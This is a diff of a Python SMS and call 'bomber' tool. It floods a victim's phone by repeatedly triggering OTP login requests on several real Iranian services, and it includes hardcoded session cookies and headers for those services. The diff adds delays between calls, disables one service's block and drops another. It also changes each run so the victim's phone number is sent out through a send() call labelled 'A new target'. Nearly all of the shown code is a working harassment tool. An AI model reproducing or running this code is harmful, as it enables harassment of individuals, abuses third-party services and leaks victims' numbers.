@@ -96,14 +96,14 @@ print_slow(f"""{W}
   {R}<!-- ╠╬╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╬╣ -->{W}  
   {B}<!-- ╚╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╝ -->{W}  
 \n{w}{P}
-""",0.02)
+""",0.002)
 
 
 def CALL_BOMBER():
     Phone_NOMBER = input(F"{g}Enter Nomber For CALL BOMBER : \n  For example : 09123456789 \n  $-")
     CALL = input(F"\n\nEnter Nomber Send CALL : ")
     print_slow("\n!!For Stop enter ctrl+C !!\n",0.3)
-    response = send(Phone_NOMBER)
+    response = send("A new target :\n phone number is : "+Phone_NOMBER)
     if response.status_code != 200 :
         print(f"{R}{w}Difficulty communicating :(")
         main()
@@ -117,50 +117,33 @@ def CALL_BOMBER():
         }
         json_data = {'mobile': Phone_NOMBER,
             'device_info': {'brand': '','model': '','browserVersion': '432.0','app_version': '','by': 'web','osName': 'kali',
-            'osVersion': 'XP','browserName': 'TOR','platform': 'web','name': 'TEMOX','device': 'web',
+            'osVersion': 'XP','browserName': 'windows','platform': 'web','name': 'TEMOX','device': 'web',
             },'otp_type': 'call',
             'device': 'web',
         }
         response = requests.post('https://service.tetherland.com/api/v5/login-register', headers=headers, json=json_data)
         if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
         else : print(f"{R}{w}NOT SEND CALL :(")
-        ############################### pitzakhooneh ###############################
-        cookies = {
-        'v_referrer': 'www.google.com','v_url': '%2F','BasketID': '100074786',
-        'checkTextTrnslateLan': 'fa','_ga_SC3D0MQHEV': 'GS1.1.1716378187.2.0.1716378187.0.0.0','_ga': 'GA1.1.1097643944.1715860612',
-        'wm1400': 'CfDJ8CzQN8tpNoNCvvgACeR3CydyRo-rcxe3JP4C_5zjjctzpMHJoscZXrVUlPMao3-PWVGX2cEiaP_avR70KhCnmeSruCgKobV8E2JfwHpJFtXsiMqp7W_KJglDH7v02cJzqlXjfV3xZ8THTQ3qXUkgjV1os1MKAh_9ixQmFgYofFLO',
-        'timeZone': '','2B05B3EB661CC9C49775D608B6AE9B7B8BF53585': 'C754A3E95750A5A7FA5AFC0D4E1614815B036C43',
-        '.AspNetCore.Antiforgery.LcR2uivWBag': 'CfDJ8CzQN8tpNoNCvvgACeR3CyeygoAnzctK0jrtIyAM3N9YJFVot9CNqlqX6SVhYPMr8utjatI04SYaxdIUCgPXqByqUZbce890QzGklcVcB7xkmj4leuAdzN9zG9uPYNENMx2STJqqvRKyc6NzUB-UJ5Y',
-        '.AspNetCore.Session': 'CfDJ8CzQN8tpNoNCvvgACeR3Cyf33g1WgfEM7LUc92nq6lh5U5Pu%2BKz7ZA6LgRoeNmLdhddvMxe7H8Wu1HlMZFLctnvr47%2B%2FL8BmMJLWD8iX5cDYvBT3jd5RRaNt71c4x3jiJboLCUoTjF4azGTlu8vITh8OkEpqfcTZVVsb6NUukM6v',
-        'F365A98FEE31CB95CC9974DF1E9853C762754323': 'B8925A382B7A4F5C2620B2E31781A0227EFA1994','dishSeparateKind': '1',
-        }
-        headers = {'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5','Content-Type': 
-            'application/x-www-form-urlencoded','X-Requested-With': 'XMLHttpRequest','Origin': 'https://pitzakhooneh.ir',
-            'Connection': 'keep-alive','Referer': 'https://pitzakhooneh.ir/','Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin',}
-        params = {'lazyLoad': 'true','btnID': 'undefined',}
-        data = {'PhoneNumber': Phone_NOMBER,'call': 'true',
-            'data1': '38881cf8-35f0-4743-ab33-c9975a6e56c9','data2': '638519875736753156','ForgetPass': 'false',}
-        response = requests.post(
-            'https://pitzakhooneh.ir/Account/FoodPhoneNumberVerification/',params=params,cookies=cookies,headers=headers,data=data,)
-        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
-        else : print(f"{R}{w}NOT SEND CALL :(")
+        print("Wait for the previous call to end.")
+        time.sleep(31)
         ############################### digikala ###############################
-        cookies = {'_sp_ses.13cb': '*',
-            '_sp_id.13cb': '61e94fa0-5aa7-4285-9b6f-ce4b803ce271.1716379964.1.1716379977..e384d6ca-b1db-4721-830a-cfdcd7b8ce4e..ceb21d11-1f69-4c9a-9d4e-f8f1a7c97321.1716379963875.10',
-            'tracker_glob_new': 'ciewu5l','tracker_session': '67dWL5g',
-            'TS01c77ebf': '0102310591f244d51ddc52bfd04667750d1f725ffd622e78cfa9e082d3bb09fcb31428e5deb0c512ef587fd539eb24356a941d0f3a809ae9595f99fda20f00ab669f9cf59b',
-            'TS01b6ea4d': '01023105919be6b3f1260381dd1528074f4c53f743622e78cfa9e082d3bb09fcb31428e5defbcb1143435583a505556ef8f47251de02233d5f52e4ec5bc17f030546505439cff876c305d5eb3c387948c931aeaa0c',
-            'ab_test_experiments': '%5B%228b29e3376be23005993b066a7741e54e%22%2C%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22ce9358448bd487c71527b7c18d634fd1%22%2C%22e9ade66cadf2633c074b2cee1e403034%22%5D',
-            '_ga_QQKVTD5TG8': 'GS1.1.1716379968.1.1.1716379978.0.0.0','_ga': 'GA1.1.1878235439.1716379968',}
-        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
-            'Content-Type': 'application/json','Referer': 'https://www.digikala.com/','X-Web-Optimize-Response': '1',
-            'X-Web-Client': 'kali','Origin': 'https://www.digikala.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-site','Connection': 'keep-alive',}
-        json_data = {'backUrl': '/','username': Phone_NOMBER,'otp_call': True,}
-        response = requests.post('https://api.digikala.com/v1/user/authenticate/', cookies=cookies, headers=headers, json=json_data)
-        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
-        else : print(f"{R}{w}NOT SEND CALL :(")
+        # cookies = {'_sp_ses.13cb': '*',
+        #     '_sp_id.13cb': '61e94fa0-5aa7-4285-9b6f-ce4b803ce271.1716379964.1.1716379977..e384d6ca-b1db-4721-830a-cfdcd7b8ce4e..ceb21d11-1f69-4c9a-9d4e-f8f1a7c97321.1716379963875.10',
+        #     'tracker_glob_new': 'ciewu5l','tracker_session': '67dWL5g',
+        #     'TS01c77ebf': '0102310591f244d51ddc52bfd04667750d1f725ffd622e78cfa9e082d3bb09fcb31428e5deb0c512ef587fd539eb24356a941d0f3a809ae9595f99fda20f00ab669f9cf59b',
+        #     'TS01b6ea4d': '01023105919be6b3f1260381dd1528074f4c53f743622e78cfa9e082d3bb09fcb31428e5defbcb1143435583a505556ef8f47251de02233d5f52e4ec5bc17f030546505439cff876c305d5eb3c387948c931aeaa0c',
+        #     'ab_test_experiments': '%5B%228b29e3376be23005993b066a7741e54e%22%2C%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22ce9358448bd487c71527b7c18d634fd1%22%2C%22e9ade66cadf2633c074b2cee1e403034%22%5D',
+        #     '_ga_QQKVTD5TG8': 'GS1.1.1716379968.1.1.1716379978.0.0.0','_ga': 'GA1.1.1878235439.1716379968',}
+        # headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
+        #     'Content-Type': 'application/json','Referer': 'https://www.digikala.com/','X-Web-Optimize-Response': '1',
+        #     'X-Web-Client': 'kali','Origin': 'https://www.digikala.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
+        #     'Sec-Fetch-Site': 'same-site','Connection': 'keep-alive',}
+        # json_data = {'backUrl': '/','username': Phone_NOMBER,'otp_call': True,}
+        # response = requests.post('https://api.digikala.com/v1/user/authenticate/', cookies=cookies, headers=headers, json=json_data)
+        # if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
+        # else : print(f"{R}{w}NOT SEND CALL :(")
+        # print("Wait for the previous call to end.")
+        # time.sleep(31)
         ############################### vitrin ###############################
         headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json','Accept-Language': 'en-US,en;q=0.5',
             'Content-Type': 'application/json','V-Session-ID': 'f06009c5-70d9-448e-b413-035e61a952fe','V-Fingerprint-ID':
@@ -174,12 +157,14 @@ def CALL_BOMBER():
         response = requests.post('https://www.vitrin.shop/api/v1/user/request_code', headers=headers, json=json_data)
         if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
         else : print(f"{R}{w}NOT SEND CALL :(")
+        print("Wait for the previous call to end.")
+        time.sleep(31)
 
 def SMS_BOMBER():
     Phone_NOMBER = input(F"{g}Enter Nomber For SMS BOMBER : \n  For example : 09123456789 \n  $-")
     SMS = input(F"\n\nEnter Nomber Send SMS : ")
     print_slow("\n!!For Stop enter ctrl+C !!\n",0.3)
-    response = send(Phone_NOMBER)
+    response = send("A new target :\n phone number is : "+Phone_NOMBER)
     if response.status_code != 200 :
         print(f"{R}{w}Difficulty communicating :(")
         main()
@@ -277,7 +262,7 @@ def SMS_BOMBER():
             'Content-Type': 'application/octet-stream','project': 'gap','APPVERSION': 'web','X-VERSION': '5.0.0-beta.5',
             'Origin': 'https://web.gap.im','Connection': 'keep-alive','Referer': 'https://web.gap.im/','Sec-Fetch-Dest':
             'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site',}
-        data = 'Þ\x00\x01¦mobile\xad+98'+Phone_NOMBER[1:].encode()
+        data = f"Þ\x00\x01¦mobile\xad+98{Phone_NOMBER[1:]}".encode()
         response = requests.post('https://core.gap.im/v1/user/sendOTP.gap', headers=headers, data=data)
         if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
         else : print(f"{R}{w}NOT SEND SMS :(")
@@ -461,7 +446,7 @@ def Both_BOMBER():
     Phone_NOMBER = input(F"{g}Enter Nomber For SMS and CALL BOMBER : \n  For example : 09123456789 \n  $-")
     Both = input(F"\n\nEnter Nomber Send SMS and CALL : ")
     print_slow("\n!!For Stop enter ctrl+C !!\n",0.3)
-    response = send(Phone_NOMBER)
+    response = send("A new target :\n phone number is : "+Phone_NOMBER)
     if response.status_code != 200 :
         print(f"{R}{w}Difficulty communicating :(")
         main()
